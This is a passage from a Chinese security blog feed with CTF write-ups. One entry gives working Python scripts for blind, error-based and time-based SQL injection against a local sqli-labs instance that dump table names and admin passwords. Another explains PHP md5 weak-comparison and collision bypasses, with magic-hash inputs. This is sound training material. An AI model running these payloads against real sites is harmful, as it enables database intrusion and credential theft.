1,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段名</span></span><br><span class="line"><span class="comment">#pay= &quot;( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line"><span class="comment">#pay = &quot;(select password from admin limit 0,1)&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#for j in range(1,10):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">high = <span class="number">127</span></span><br><span class="line">low = <span class="number">32</span></span><br><span class="line">mid = (low + high) // <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> high &gt; low:</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(&quot;</span>+pay+<span class="string">&quot;,%d,1))&lt;=&#x27;%s&#x27;--+&quot;</span>%(i,mid)</span><br><span class="line">r=requests.get(url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">high = mid</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">low = mid+<span class="number">1</span></span><br><span class="line">mid = (low + high) // <span class="number">2</span></span><br><span class="line">s += chr(int(mid))</span><br><span class="line">print(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>SQL报错注入就是利用数据库的某些查询报错的机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p><p>这里我们使用floor报错来解题。（floor报错原理这里不再叙述）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#爆数据库</span></span><br><span class="line">pay=<span class="string">&quot;database()&quot;</span></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line"><span class="comment">#pay = &quot;(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段名</span></span><br><span class="line"><span class="comment">#pay= &quot;( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line"><span class="comment">#pay = &quot;(select password from admin limit 0,1)&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1%27%20and id=1 and (select 1 from (select count(*),concat(&quot;</span>+pay+<span class="string">&quot;,floor(rand(0)*2))x from information_schema.tables group by x)a) --+;&quot;</span></span><br><span class="line">r=requests.get(url)</span><br><span class="line">print(re.findall(<span class="string">&quot;Duplicate entry &#x27;(.*?)1&#x27; for key&quot;</span>,r.text))</span><br></pre></td></tr></table></figure><h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>当判断错误时，1秒多就返回页面。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/14.png"></p><p>当判断正确时，会休眠5秒后再返回页面，也就6秒多才返回页面。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/15.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">tables = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789!@#$%^&amp;*()_+&#123;&#125;|?&gt;&lt;&quot;</span></span><br><span class="line"><span class="comment">#爆数据库名</span></span><br><span class="line">pay = <span class="string">&#x27;database()&#x27;</span></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line"><span class="comment">#pay = &quot;(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段名</span></span><br><span class="line"><span class="comment">#pay= &quot;( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line"><span class="comment">#pay = &quot;(select password from admin limit 0,1)&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tables:</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and if(substr(&quot;</span>+pay+<span class="string">&quot;,%d,1)=&#x27;%s&#x27;,sleep(5),0)--+&quot;</span>%(j,i)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    r=requests.get(url=url,timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#print(url)</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        s=s+i</span><br><span class="line">        print(s)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前言：sql注入是ctf比赛中的一大考点，借助这道题复习一下sql注入，使用三种方法解答这道题，主要练习编写sql注入脚本。&lt;/p&gt;
&lt;h2 id=&quot;判断注入类型&quot;&gt;&lt;a href=&quot;#判断注入类型&quot; class=&quot;headerlink&quot; title=&quot;判断注入类型&quot;&gt;&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>浅析md5弱类型比较和强碰撞</title>
    <link href="http://www.yoyo2tong.xyz/2021/02/03/%E6%B5%85%E8%B0%88md5%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E5%92%8C%E5%BC%BA%E7%A2%B0%E6%92%9E/"/>
    <id>http://www.yoyo2tong.xyz/2021/02/03/%E6%B5%85%E8%B0%88md5%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E5%92%8C%E5%BC%BA%E7%A2%B0%E6%92%9E/</id>
    <published>2021-02-03T06:53:18.035Z</published>
    <updated>2021-03-25T15:09:54.583Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在CTF中，md5的题目太常见了，虽然有很多这方面的文章，但相对来说比较零散，这里主要将自己学习和比赛时遇到的md5弱类型和强碰撞的题目从浅到深地梳理一下。</p><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><p>php中有两种比较的符号==与===<br>==在进行比较的时候，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。</p><p>===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/1.png"></p><p>0e开头且都是数字的字符串，弱类型比较都等于0。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/2.png"></p><h2 id="比较"><a href="#比较" class="headerlink" title="==比较"></a>==比较</h2><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) == md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are wrong&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;请输入不同的a，b值&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>由于md5不能加密数组，在加密数组的时候会返回NULL</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/3.png"></p><p>所以，我们可以传入两个数组</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/4.png"></p><h3 id="解放2"><a href="#解放2" class="headerlink" title="解放2"></a>解放2</h3><p>可以传入两个md5加密后是0e开头的字符串，需要注意的地方是，这个以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候才会将它转化为0。可以查找以0e开头md5加密相等的字符串，也可以自己编写代码，提供以下脚本。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($a=<span class="number">1</span>;$a&lt;=<span class="number">1000000000</span>;$a++)&#123;</span><br><span class="line">   $md5 = md5($a);</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^0e\d+$/&#x27;</span>,$md5))&#123;</span><br><span class="line">      <span class="keyword">echo</span> $a;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> $md5;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/5.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/6.png"></p><h2 id="比较-1"><a href="#比较-1" class="headerlink" title="===比较"></a>===比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are wrong&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;请输入不同的a，b值&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><p>也可以传入两个数组，但不再适合传入两个0e开头的字符串，因为===是md5的强碰撞，进行了严格的过滤。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/7.png"></p><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p>使用md5加密后两个完全相等的两个字符串来绕过过滤。</p><p>如何生成两个不一样的字符串，但是MD5是一样的呢。参考<a href="https://xz.aliyun.com/t/2232">如何用不同的数值构建一样的MD5</a>后，我们可以使用快速MD5碰撞生成器来构建两个MD5一样，但内容完全不一样的字符串。</p><p><a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">fastcoll_v1.0.0.5.exe.zip</a>  </p><h4 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h4><p>创建一个文本文件，写入任意的文件内容，命名为ywj.txt （源文件）</p><p>运行fastcoll输出以下参数。-p 是源文件，-o是输出文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p ywj.txt -o 1.txt 2.txt</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/8.png"></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>对生产的1.txt和2.txt文件进行测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span>(<span class="params">$path</span>)</span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;二进制md5加密 &#x27;</span>. md5( (readmyfile(<span class="string">&quot;1.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;url编码 &#x27;</span>. urlencode(readmyfile(<span class="string">&quot;1.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;二进制md5加密 &#x27;</span>.md5( (readmyfile(<span class="string">&quot;2.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;url编码 &#x27;</span>.  urlencode(readmyfile(<span class="string">&quot;2.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">二进制md5加密 8e4ef6c69a337c0de0208455ee69a416</span><br><span class="line"></span><br><span class="line">url编码 1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8EF%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28%FAU%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9b4%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%9DFH%F1%25%AC%DF%FA%C4G%27uW%CFNB%E7%EF%B0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二进制md5加密 8e4ef6c69a337c0de0208455ee69a416</span><br><span class="line"></span><br><span class="line">url编码 1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8E%C6%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28zV%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9%E24%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D%B7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%1DFH%F1%25%AC%DF%FA%C4G%27uW%CF%CEB%E7%EF%B0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，1.txt和2.txt文件二进制md5加密后的结果完全相同。由于1.txt和2.txt文件中含有不可见字符，所以需要将其url编码后使用。可以看到url编码后的两个字符串不完全相同，满足我们输入两个不同参数的需要。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/9.png"></p><p>当题目限制不能传入数组，只能传入字符串时，如下例题，就只能采用解法2.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)$_GET[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_GET[<span class="string">&#x27;a&#x27;</span>])===md5($_GET[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;you are right&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;you are wrong&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HECTF-ezphp"><a href="#HECTF-ezphp" class="headerlink" title="HECTF  ezphp"></a>HECTF  ezphp</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line">$string_1 = $_GET[<span class="string">&#x27;str1&#x27;</span>]; </span><br><span class="line">$string_2 = $_GET[<span class="string">&#x27;str2&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;param1&#x27;</span>]!==$_GET[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_GET[<span class="string">&#x27;param1&#x27;</span>])===md5($_GET[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_numeric($string_1))&#123; </span><br><span class="line">            $md5_1 = md5($string_1); </span><br><span class="line">            $md5_2 = md5($string_2); </span><br><span class="line">            <span class="keyword">if</span>($md5_1 != $md5_2)&#123; </span><br><span class="line">                $a = strtr($md5_1, <span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>); </span><br><span class="line">                $b = strtr($md5_2, <span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>); </span><br><span class="line">                <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> $flag;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;md5 is wrong&quot;</span>); </span><br><span class="line">            &#125;</span><br><span class="line">            &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;str1 not number&#x27;</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先查看一些strtr()函数的用法：</p><p>strtr() 函数转换字符串中特定的字符。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/10.png"></p><p>观察源码，要求传入四个参数，首先param1===param2,因为没有别的限制，所以我们可以传入两个数组。<br>对于是str1和str2，首先str1只能是数字，且最后$a == $b，但md5_1 != md5_2，所以我们不能传入两个md5加密后以0e开头的字符串。</p><p>又因为会将md5加密后的str1和str2中的cxhp替换成0123，也就是说c会被替换成0，所以一个ce开头的字符串会被替换成0e开头的字符串。</p><p>可以想到只要找到两个md5加密后是ce开头的字符串，或者一个md5加密后是ce开头的字符串，一个md5加密后是0e开头的字符串就可以绕过过滤。</p><p>构造脚本</p><p>这是一开始的脚本，返回值少，且执行速度慢。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($a=<span class="number">1</span>;$a&lt;=<span class="number">1000000000</span>;$a++)&#123;</span><br><span class="line">   $md5 = md5($a);</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^ce\d+$/&#x27;</span>,$md5))&#123;</span><br><span class="line">      <span class="keyword">echo</span> $a;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> $md5;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/11.png" alt="16"></p><p>这是进一步优化的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($a = <span class="number">1</span>; $a &lt;= <span class="number">100000000</span>; $a++) &#123;</span><br><span class="line">   $md5 = strtr(md5($a),<span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>);</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^0e\d+$/&#x27;</span>, $md5)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> $a;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> $md5;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/12.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/13.png"></p><h2 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    $a = rand(<span class="number">133</span>,<span class="number">600</span>)*<span class="number">78</span>;</span><br><span class="line">    $b = rand(<span class="number">18</span>,<span class="number">195</span>);</span><br><span class="line">    <span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">$r = random();</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">string</span>)$_GET[<span class="string">&#x27;a&#x27;</span>]==(<span class="keyword">string</span>)md5($_GET[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>($a.$r == $b) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Yes,you are right&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;you are wrong&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>观察代码，有一个rondom方法，返回的是一个随机数，在这道题中，不需要清楚返回的是什么内容，我们只要知道返回的是一串数字就可以了。传入两个参数a和b，要求传入的是字符串，b会经过md5加密。最后要让$a.$r == $b。因为是弱类型比较，且只能传入字符串，想要的是两个0e开头的字符串进行比较，前面我们已经知道，以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候才会将它转化为0。所以保证$a以0e开头就可以了，因为$r是一串数字，所以$a.$r在php中还是可以被解析为0。因为$b是参数b经过md5加密而来，所以我们传入md5加密后是0e开头的字符串即可。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/14.png"></p>]]></content>
    
    
      
      
